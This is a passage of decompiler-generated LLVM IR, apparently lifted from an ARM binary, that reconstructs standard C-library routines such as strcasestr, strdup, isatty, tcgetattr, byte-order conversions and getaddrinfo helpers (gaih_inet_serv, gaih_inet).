  %v0_2654c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2654c

dec_label_pc_2654c:                               ; preds = %bb16, %dec_label_pc_26510
  %v0_2654c = phi i32 [ %v0_264f4, %bb16 ], [ %v0_2654c.pre, %dec_label_pc_26510 ]
  %v1_2654c = inttoptr i32 %v0_2654c to i8*
  %v3_26550 = call i32 @strlen(i8* %v1_2654c)
  %v0_26554 = load i32, i32* @r7, align 4
  %v2_26554 = icmp eq i32 %v0_26554, 0
  br i1 %v2_26554, label %bb17, label %dec_label_pc_2654c._crit_edge

dec_label_pc_2654c._crit_edge:                    ; preds = %dec_label_pc_2654c
  %v1_26560.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_2654c
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_2654c._crit_edge, %bb17
  %v1_26560 = phi i32 [ %v1_26560.pre, %dec_label_pc_2654c._crit_edge ], [ 0, %bb17 ]
  %v1_2655c = add i32 %v3_26550, 1
  %v3_26560 = icmp uge i32 %v1_2655c, %v1_26560
  %v9_26560 = icmp eq i32 %v1_2655c, %v1_26560
  %v2_26564 = xor i1 %v3_26560, true
  %v3_26564 = or i1 %v9_26560, %v2_26564
  br i1 %v3_26564, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_2655c, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_26574 = phi i32 [ %v1_26560, %bb18 ], [ %v1_2655c, %bb19 ]
  %v2_26568 = xor i1 %v9_26560, true
  %v3_26568 = and i1 %v3_26560, %v2_26568
  br i1 %v3_26568, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_2656c = icmp eq i32 %v0_26574, 0
  br i1 %v2_2656c, label %dec_label_pc_26590, label %dec_label_pc_26574

dec_label_pc_26574:                               ; preds = %bb22
  store i32 %v0_26574, i32* @r2, align 4
  %v0_26578 = load i32, i32* @r5, align 4
  store i32 %v0_26578, i32* @r1, align 4
  store i32 %v0_26554, i32* @r0, align 4
  %v0_26580 = call i32 @memcpy()
  %v0_26584 = load i32, i32* @r4, align 4
  %v1_26584 = load i32, i32* @r7, align 4
  %v2_26584 = add i32 %v1_26584, %v0_26584
  %v3_2658c = add i32 %v2_26584, -1
  %v4_2658c = inttoptr i32 %v3_2658c to i8*
  store i8 0, i8* %v4_2658c, align 1
  br label %dec_label_pc_26590

dec_label_pc_26590:                               ; preds = %bb22, %dec_label_pc_26574
  %v0_26590 = load i32, i32* %r6.global-to-local, align 4
  %v2_26590 = icmp eq i32 %v0_26590, 0
  br i1 %v2_26590, label %dec_label_pc_265a0, label %dec_label_pc_26598

dec_label_pc_26598:                               ; preds = %dec_label_pc_26590
  %v0_26598 = call i32 @__GI___errno_location()
  %v0_2659c = load i32, i32* %r6.global-to-local, align 4
  %v2_2659c = inttoptr i32 %v0_26598 to i32*
  store i32 %v0_2659c, i32* %v2_2659c, align 4
  %v0_265a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_265a0

dec_label_pc_265a0:                               ; preds = %dec_label_pc_26590, %dec_label_pc_26598
  %v0_265a0 = phi i32 [ 0, %dec_label_pc_26590 ], [ %v0_265a0.pre, %dec_label_pc_26598 ]
  store i32 %v3_264bc, i32* @r4, align 4
  store i32 %v9_264bc, i32* %r6.global-to-local, align 4
  store i32 %v12_264bc, i32* @r7, align 4
  ret i32 %v0_265a0

; uselistorder directives
  uselistorder i1 %v3_26560, { 1, 0 }
  uselistorder i32 %v0_264f4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_26508, { 1, 0, 2 }
  uselistorder i32 %v0_264c4, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_265a0, { 1, 0 }
  uselistorder label %dec_label_pc_26590, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_2654c, { 1, 0 }
  uselistorder label %dec_label_pc_264f8, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_265c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_265dc23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_265dc.outer

dec_label_pc_265dc.outer:                         ; preds = %dec_label_pc_2661c, %entry
  %v0_2661c.ph = phi i32 [ %v1_2661c, %dec_label_pc_2661c ], [ %v0_265c8, %entry ]
  %v2_265dc24 = load i8, i8* %v1_265dc23, align 1
  %v2_265e026 = icmp eq i8 %v2_265dc24, 0
  br i1 %v2_265e026, label %bb, label %dec_label_pc_265f4

bb:                                               ; preds = %dec_label_pc_265dc.backedge, %dec_label_pc_265dc.outer
  store i32 %v0_2661c.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26630

dec_label_pc_265f4:                               ; preds = %dec_label_pc_265dc.outer, %dec_label_pc_265dc.backedge
  %v1_265e832.in = phi i32 [ %v1_265e832, %dec_label_pc_265dc.backedge ], [ %arg2, %dec_label_pc_265dc.outer ]
  %v2_265dc30 = phi i8 [ %v2_265dc, %dec_label_pc_265dc.backedge ], [ %v2_265dc24, %dec_label_pc_265dc.outer ]
  %v2_265e431.in.in = phi i8 [ %v2_265dc, %dec_label_pc_265dc.backedge ], [ %v2_265dc24, %dec_label_pc_265dc.outer ]
  %v0_2660029 = phi i32 [ %v1_26600, %dec_label_pc_265dc.backedge ], [ %v0_2661c.ph, %dec_label_pc_265dc.outer ]
  %v1_265e832 = add i32 %v1_265e832.in, 1
  %v1_265f4 = inttoptr i32 %v0_2660029 to i8*
  %v2_265f4 = load i8, i8* %v1_265f4, align 1
  %v3_265f4 = zext i8 %v2_265f4 to i32
  store i32 %v3_265f4, i32* %r0.global-to-local, align 4
  %v9_265f8 = icmp eq i8 %v2_265dc30, %v2_265f4
  %v1_26600 = add i32 %v0_2660029, 1
  br i1 %v9_265f8, label %dec_label_pc_265dc.backedge, label %dec_label_pc_26608

dec_label_pc_265dc.backedge:                      ; preds = %dec_label_pc_265f4, %dec_label_pc_26608
  %v1_265dc = inttoptr i32 %v1_265e832 to i8*
  %v2_265dc = load i8, i8* %v1_265dc, align 1
  %v2_265e0 = icmp eq i8 %v2_265dc, 0
  br i1 %v2_265e0, label %bb, label %dec_label_pc_265f4

dec_label_pc_26608:                               ; preds = %dec_label_pc_265f4
  %v2_265e431.in = zext i8 %v2_265e431.in.in to i32
  %v2_265fc = mul nuw nsw i32 %v3_265f4, 2
  %v2_265e431 = mul nuw nsw i32 %v2_265e431.in, 2
  %v4_26608 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20836) to i32*), align 4
  %v2_2660c = add i32 %v4_26608, %v2_265fc
  %v3_2660c = inttoptr i32 %v2_2660c to i16*
  %v4_2660c = load i16, i16* %v3_2660c, align 2
  %v2_26610 = add i32 %v4_26608, %v2_265e431
  %v3_26610 = inttoptr i32 %v2_26610 to i16*
  %v4_26610 = load i16, i16* %v3_26610, align 2
  %v9_26614 = icmp eq i16 %v4_26610, %v4_2660c
  br i1 %v9_26614, label %dec_label_pc_265dc.backedge, label %dec_label_pc_2661c

dec_label_pc_2661c:                               ; preds = %dec_label_pc_26608
  %v1_2661c = add i32 %v0_2661c.ph, 1
  %v2_26620 = icmp eq i8 %v2_265f4, 0
  br i1 %v2_26620, label %dec_label_pc_26630, label %dec_label_pc_265dc.outer

dec_label_pc_26630:                               ; preds = %dec_label_pc_2661c, %bb
  %v1_26634 = phi i32 [ %v0_2661c.ph, %bb ], [ 0, %dec_label_pc_2661c ]
  ret i32 %v1_26634

; uselistorder directives
  uselistorder i8 %v2_265dc, { 2, 1, 0 }
  uselistorder i32 %v0_2660029, { 1, 0 }
  uselistorder i32 %v0_2661c.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_265dc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_265f4, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_26640 = load i32, i32* @r4, align 4
  store i32 %v3_26640, i32* %stack_var_-16, align 4
  %v9_26640 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_26648 = call i32 @strlen(i8* %arg1)
  %v1_2664c = add i32 %v3_26648, 1
  store i32 %v1_2664c, i32* @r4, align 4
  %v1_26654 = call i32 @malloc(i32 %v1_2664c)
  store i32 %v1_26654, i32* %r5.global-to-local, align 4
  %v2_26658 = icmp eq i32 %v1_26654, 0
  br i1 %v2_26658, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_26664 = xor i1 %v2_26658, true
  call void @__pseudo_cond_branch(i1 %v1_26664, i32 ptrtoint (i32* @global_var_25f40.1708 to i32))
  %v0_26668 = load i32, i32* %r5.global-to-local, align 4
  %v2_2666c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2666c, i32* @r4, align 4
  store i32 %v9_26640, i32* @r6, align 4
  ret i32 %v0_26668

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_2667c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_2667c, i32* @r1, align 4
  %v0_26680 = call i32 @__GI_tcgetattr()
  %v1_26684 = sub i32 1, %v0_26680
  %v2_26684 = icmp ult i32 %v0_26680, 2
  br i1 %v2_26684, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_26694 = phi i32 [ %v1_26684, %entry ], [ 0, %bb ]
  ret i32 %v1_26694

; uselistorder directives
  uselistorder i32 %v0_26680, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_26698 = load i32, i32* @r4, align 4
  %v6_26698 = load i32, i32* @r5, align 4
  %v2_266a0 = ptrtoint i32* %stack_var_-52 to i32
  %v0_266a4 = load i32, i32* @r1, align 4
  store i32 %v0_266a4, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_266b0 = load i32, i32* @r0, align 4
  %v3_266b0 = call i32 @ioctl(i32 %v0_266b0, i32 21505, i32 %v2_266a0)
  store i32 %v3_266b0, i32* %r0.global-to-local, align 4
  store i32 %v3_266b0, i32* @r5, align 4
  %v2_266b4 = icmp eq i32 %v3_266b0, 0
  br i1 %v2_266b4, label %dec_label_pc_266bc, label %dec_label_pc_26700

dec_label_pc_266bc:                               ; preds = %entry
  %v4_266c8 = zext i8 %tmp to i32
  store i32 %v4_266c8, i32* @ip, align 4
  %v3_266cc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_266cc, i32* @r3, align 4
  %v1_266d0 = load i32, i32* @r4, align 4
  %v2_266d0 = add i32 %v1_266d0, 4
  %v3_266d0 = inttoptr i32 %v2_266d0 to i32*
  %v0_266d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_266d4 = load i32, i32* @r4, align 4
  %v2_266d4 = add i32 %v1_266d4, 8
  %v3_266d4 = inttoptr i32 %v2_266d4 to i32*
  store i32 %v0_266d4, i32* %v3_266d4, align 4
  %v0_266d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_266d8 = load i32, i32* @r4, align 4
  %v2_266d8 = add i32 %v1_266d8, 12
  %v3_266d8 = inttoptr i32 %v2_266d8 to i32*
  store i32 %v0_266d8, i32* %v3_266d8, align 4
  %v2_266dc = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_266dc, i32* @r1, align 4
  %v1_266e4 = load i32, i32* @r4, align 4
  %v2_266e4 = inttoptr i32 %v1_266e4 to i32*
  store i32 %v3_266cc, i32* %v2_266e4, align 4
  %v0_266e8 = load i32, i32* @ip, align 4
  %v1_266e8 = trunc i32 %v0_266e8 to i8
  %v2_266e8 = load i32, i32* @r4, align 4
  %v3_266e8 = add i32 %v2_266e8, 16
  %v4_266e8 = inttoptr i32 %v3_266e8 to i8*
  store i8 %v1_266e8, i8* %v4_266e8, align 1
  %v0_266ec = load i32, i32* @r4, align 4
  %v1_266ec = add i32 %v0_266ec, 17
  store i32 %v1_266ec, i32* %r0.global-to-local, align 4
  %v4_266f0 = call i32 @__GI_mempcpy(i32 %v1_266ec, i32 %v2_266dc, i32 19, i32 %v3_266cc)
  store i32 %v4_266f0, i32* @r0, align 4
  %v0_266f4 = load i32, i32* @r5, align 4
  store i32 %v0_266f4, i32* @r1, align 4
  store i32 13, i32* @r2, align 4
  %v0_266fc = call i32 @__GI_memset()
  store i32 %v0_266fc, i32* %r0.global-to-local, align 4
  %v0_26700.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_26700

dec_label_pc_26700:                               ; preds = %entry, %dec_label_pc_266bc
  %v0_26700 = phi i32 [ %v3_266b0, %entry ], [ %v0_26700.pre, %dec_label_pc_266bc ]
  store i32 %v0_26700, i32* %r0.global-to-local, align 4
  store i32 %v3_26698, i32* @r4, align 4
  store i32 %v6_26698, i32* @r5, align 4
  ret i32 %v0_26700

; uselistorder directives
  uselistorder i32 %v0_26700, { 1, 0 }
  uselistorder label %dec_label_pc_26700, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v4_26724 = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v4_26724
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_26738 = udiv i32 %arg1, 256
  %v1_2673c = mul i32 %arg1, 256
  %v4_26740 = and i32 %v1_2673c, 65280
  %v5_26740 = or i32 %v4_26740, %v3_26738
  ret i32 %v5_26740
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_26760 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_26760
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_26768 = udiv i32 %arg1, 256
  %v1_2676c = mul i32 %arg1, 256
  %v4_26770 = and i32 %v1_2676c, 65280
  %v5_26770 = or i32 %v4_26770, %v3_26768
  ret i32 %v5_26770
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_26790 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_26790
}

define i32 @gaih_inet_serv(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_2679c = load i32, i32* @r4, align 4
  %v6_2679c = load i32, i32* @r5, align 4
  %v9_2679c = load i32, i32* @r6, align 4
  %v12_2679c = load i32, i32* @r7, align 4
  %v15_2679c = load i32, i32* @r8, align 4
  %v18_2679c = load i32, i32* @sb, align 4
  %v21_2679c = load i32, i32* @sl, align 4
  %v24_2679c = load i32, i32* @fp, align 4
  store i32 157604, i32* %stack_var_-4, align 4
  %v2_267a0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_267a0, i32* @fp, align 4
  %v2_267a4 = ptrtoint i32* %stack_var_-88 to i32
  %v0_267a8 = load i32, i32* @r3, align 4
  store i32 %v0_267a8, i32* @r5, align 4
  %v2_267ac = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_267ac, i32* %r3.global-to-local, align 4
  %v0_267b4 = load i32, i32* @r1, align 4
  store i32 %v0_267b4, i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  %v0_267bc = load i32, i32* @r2, align 4
  store i32 %v0_267bc, i32* @sl, align 4
  store i32 1024, i32* @r6, align 4
  %v1_267c4 = add i32 %v0_267b4, 3
  store i32 %v1_267c4, i32* @r7, align 4
  %v2_267c8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_267c8, i32* @sb, align 4
  br label %dec_label_pc_267cc

dec_label_pc_267cc:                               ; preds = %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge, %entry
  %v0_267dc = phi i32 [ %v0_267dc.pre, %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge ], [ %v1_267c4, %entry ]
  %v0_267d8 = phi i32 [ %v0_267d8.pre, %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge ], [ %arg1, %entry ]
  %v1_267d4 = phi i32 [ %v1_267d4.pre, %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge ], [ %v2_267a4, %entry ]
  %v2_267e8 = phi i32 [ %v2_267f4, %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge ], [ 1024, %entry ]
  %v1_267cc = add i32 %v2_267e8, 14
  %v1_267d0 = and i32 %v1_267cc, -8
  %v2_267d4 = sub i32 %v1_267d4, %v1_267d0
  store i32 %v0_267d8, i32* %r0.global-to-local, align 4
  store i32 %v0_267dc, i32* %r1.global-to-local, align 4
  %v1_267e4 = add i32 %v2_267d4, 8
  store i32 %v1_267e4, i32* %r3.global-to-local, align 4
  %v1_267e8 = inttoptr i32 %v2_267d4 to i32*
  store i32 %v2_267e8, i32* %v1_267e8, align 4
  %v3_267e8 = add i32 %v2_267d4, 4
  %v4_267e8 = inttoptr i32 %v3_267e8 to i32*
  store i32 %v2_267c8, i32* %v4_267e8, align 4
  %v1_267ec = load i32, i32* %r1.global-to-local, align 4
  %v5_267ec = call i32 @getservbyname_r(i32 %v0_267d8, i32 %v1_267ec, i32* nonnull %stack_var_-68, i32 %v1_267e4)
  store i32 %v5_267ec, i32* %r0.global-to-local, align 4
  %v2_267f0 = icmp eq i32 %v5_267ec, 0
  %v0_267f4 = load i32, i32* @r6, align 4
  %v2_267f4 = mul i32 %v0_267f4, 2
  store i32 %v2_267f4, i32* @r6, align 4
  br i1 %v2_267f0, label %dec_label_pc_267fc, label %dec_label_pc_2680c

dec_label_pc_267fc:                               ; preds = %dec_label_pc_267cc
  %v3_267fc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_267fc, i32* %r3.global-to-local, align 4
  %v2_26800 = icmp eq i32 %v3_267fc, 0
  br i1 %v2_26800, label %dec_label_pc_2684c, label %dec_label_pc_26818

dec_label_pc_2680c:                               ; preds = %dec_label_pc_267cc
  %v7_2680c = icmp eq i32 %v5_267ec, 34
  br i1 %v7_2680c, label %dec_label_pc_2680c.dec_label_pc_267cc_crit_edge, label %dec_label_pc_2684c

dec_label_pc_2680c.dec_label_pc_267cc_crit_edge:  ; preds = %dec_label_pc_2680c
  %v1_267d4.pre = load i32, i32* @sp, align 4
  %v0_267d8.pre = load i32, i32* @r8, align 4
  %v0_267dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_267cc

dec_label_pc_26818:                               ; preds = %dec_label_pc_267fc
  %v1_26818 = load i32, i32* @r5, align 4
  %v2_26818 = inttoptr i32 %v1_26818 to i32*
  store i32 0, i32* %v2_26818, align 4
  %v0_2681c = load i32, i32* @r4, align 4
  %v1_2681c = inttoptr i32 %v0_2681c to i8*
  %v2_2681c = load i8, i8* %v1_2681c, align 1
  %v3_2681c = sext i8 %v2_2681c to i32
  store i32 %v3_2681c, i32* %r3.global-to-local, align 4
  %v1_26820 = load i32, i32* @r5, align 4
  %v2_26820 = add i32 %v1_26820, 4
  %v3_26820 = inttoptr i32 %v2_26820 to i32*
  store i32 %v3_2681c, i32* %v3_26820, align 4
  %v0_26824 = load i32, i32* @r4, align 4
  %v1_26824 = add i32 %v0_26824, 2
  %v2_26824 = inttoptr i32 %v1_26824 to i8*
  %v3_26824 = load i8, i8* %v2_26824, align 1
  %v4_26824 = zext i8 %v3_26824 to i32
  store i32 %v4_26824, i32* %r3.global-to-local, align 4
  %v1_26828 = and i32 %v4_26824, 2
  %v2_26828 = icmp eq i32 %v1_26828, 0
  br i1 %v2_26828, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_26818
  %v1_2682c = load i32, i32* @sl, align 4
  %v2_2682c = add i32 %v1_2682c, 12
  %v3_2682c = inttoptr i32 %v2_2682c to i32*
  %v4_2682c = load i32, i32* %v3_2682c, align 4
  br label %bb24

.thread:                                          ; preds = %dec_label_pc_26818
  %v2_26830 = add i32 %v0_26824, 1
  %v3_26830 = inttoptr i32 %v2_26830 to i8*
  %v4_26830 = load i8, i8* %v3_26830, align 1
  %v5_26830 = sext i8 %v4_26830 to i32
  br label %bb24

bb24:                                             ; preds = %bb, %.thread
  %storemerge = phi i32 [ %v4_2682c, %bb ], [ %v5_26830, %.thread ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v3_26834 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_26834, i32* %r3.global-to-local, align 4
  %v1_26838 = load i32, i32* @r5, align 4
  %v2_26838 = add i32 %v1_26838, 8
  %v3_26838 = inttoptr i32 %v2_26838 to i32*
  store i32 %storemerge, i32* %v3_26838, align 4
  %v0_2683c = load i32, i32* %r3.global-to-local, align 4
  %v1_2683c = add i32 %v0_2683c, 8
  %v2_2683c = inttoptr i32 %v1_2683c to i32*
  %v3_2683c = load i32, i32* %v2_2683c, align 4
  store i32 %v3_2683c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_26844 = load i32, i32* @r5, align 4
  %v2_26844 = add i32 %v1_26844, 12
  %v3_26844 = inttoptr i32 %v2_26844 to i32*
  store i32 %v3_2683c, i32* %v3_26844, align 4
  %v1_26858.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26850

dec_label_pc_2684c:                               ; preds = %dec_label_pc_2680c, %dec_label_pc_267fc
  store i32 264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26850

dec_label_pc_26850:                               ; preds = %bb24, %dec_label_pc_2684c
  %v1_26858 = phi i32 [ %v1_26858.pre, %bb24 ], [ 264, %dec_label_pc_2684c ]
  store i32 %v3_2679c, i32* @r4, align 4
  store i32 %v6_2679c, i32* @r5, align 4
  store i32 %v9_2679c, i32* @r6, align 4
  store i32 %v12_2679c, i32* @r7, align 4
  store i32 %v15_2679c, i32* @r8, align 4
  store i32 %v18_2679c, i32* @sb, align 4
  store i32 %v21_2679c, i32* @sl, align 4
  store i32 %v24_2679c, i32* @fp, align 4
  ret i32 %v1_26858

; uselistorder directives
  uselistorder i32 %v2_267d4, { 1, 2, 0 }
  uselistorder i32 %v0_267d8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 5, 4, 0 }
  uselistorder label %dec_label_pc_26850, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @__set_h_errno() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2685c = load i32, i32* @r4, align 4
  store i32 %v3_2685c, i32* %stack_var_-8, align 4
  %v0_26860 = load i32, i32* @r0, align 4
  store i32 %v0_26860, i32* %r4.global-to-local, align 4
  %v0_26864 = call i32 @__GI___h_errno_location()
  %v2_26868 = inttoptr i32 %v0_26864 to i32*
  store i32 %v0_26860, i32* %v2_26868, align 4
  %v0_2686c = load i32, i32* %r4.global-to-local, align 4
  %v2_26870 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_26870, i32* %r4.global-to-local, align 4
  ret i32 %v0_2686c
}

define i32 @gaih_inet(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-150 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_26878 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_26878, i32* @ip, align 4
  %v12_2687c = load i32, i32* @r7, align 4
  store i32 157828, i32* %stack_var_-4, align 4
  %v2_26880 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_26880, i32* @fp, align 4
  store i32 %arg3, i32* @r8, align 4
  %v1_2688c = add i32 %arg3, 4
  %v2_2688c = inttoptr i32 %v1_2688c to i32*
  %v3_2688c = load i32, i32* %v2_2688c, align 4
  store i32 %v3_2688c, i32* %r2.global-to-local, align 4
  %v7_26890 = icmp eq i32 %v3_2688c, 10
  br i1 %v7_26890, label %bb272, label %bb

bb:                                               ; preds = %entry
  %v3_26894 = icmp eq i32 %v3_2688c, 0
  %v0_26898 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v3_26894, label %bb273, label %.thread19.thread

.thread19.thread:                                 ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb274

bb272:                                            ; preds = %entry
  %v0_268987 = load i32, i32* %r3.global-to-local, align 4
  br label %bb273

bb273:                                            ; preds = %bb, %bb272
  %v0_268988121822 = phi i32 [ %v0_268987, %bb272 ], [ %v0_26898, %bb ]
  %storemerge227.in = inttoptr i32 %arg3 to i32*
  %storemerge227 = load i32, i32* %storemerge227.in, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_268a8 = udiv i32 %storemerge227, 8
  %v2_268b0 = urem i32 %v4_268a8, 2
  store i32 %v2_268b0, i32* %r3.global-to-local, align 4
  br label %bb274

bb274:                                            ; preds = %.thread19.thread, %bb273
  %v0_268c8 = phi i32 [ %v2_268b0, %bb273 ], [ 0, %.thread19.thread ]
  %v0_26898812172025 = phi i32 [ %v0_268988121822, %bb273 ], [ %v0_26898, %.thread19.thread ]
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_268bc = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_268bc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_268cc = call i32 @__GI_memset()
  store i32 %v0_268cc, i32* %r0.global-to-local, align 4
  %v0_268d0 = load i32, i32* @r8, align 4
  %v1_268d0 = add i32 %v0_268d0, 12
  %v2_268d0 = inttoptr i32 %v1_268d0 to i32*
  %v3_268d0 = load i32, i32* %v2_268d0, align 4
  store i32 %v3_268d0, i32* %r0.global-to-local, align 4
  %v2_268d8 = icmp eq i32 %v3_268d0, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @sb, align 4
  %v1_268e4 = add i32 %v0_268d0, 8
  %v2_268e4 = inttoptr i32 %v1_268e4 to i32*
  br i1 %v2_268d8, label %dec_label_pc_268e4, label %dec_label_pc_26930

dec_label_pc_268e4:                               ; preds = %bb274
  %v3_268e4 = load i32, i32* %v2_268e4, align 4
  store i32 %v3_268e4, i32* %r3.global-to-local, align 4
  %v2_268e8 = icmp eq i32 %v3_268e4, 0
  br i1 %v2_268e8, label %dec_label_pc_2695c, label %dec_label_pc_26930

dec_label_pc_268f4:                               ; preds = %dec_label_pc_2693c
  br i1 %v2_2694c, label %dec_label_pc_26908, label %dec_label_pc_268fc

dec_label_pc_268fc:                               ; preds = %dec_label_pc_268f4
  %v1_268fc = inttoptr i32 %v0_26928 to i8*
  %v2_268fc = load i8, i8* %v1_268fc, align 1
  %v3_268fc = sext i8 %v2_268fc to i32
  store i32 %v3_268fc, i32* %r3.global-to-local, align 4
  %v9_26900 = icmp eq i32 %v3_26944, %v3_268fc
  br i1 %v9_26900, label %dec_label_pc_26908, label %dec_label_pc_26928

dec_label_pc_26908:                               ; preds = %dec_label_pc_268fc, %dec_label_pc_268f4
  br i1 %v2_268d8, label %dec_label_pc_26964, label %dec_label_pc_26910

dec_label_pc_26910:                               ; preds = %dec_label_pc_26908
  %v1_26910 = add i32 %v0_26928, 1
  %v2_26910 = inttoptr i32 %v1_26910 to i8*
  %v3_26910 = load i8, i8* %v2_26910, align 1
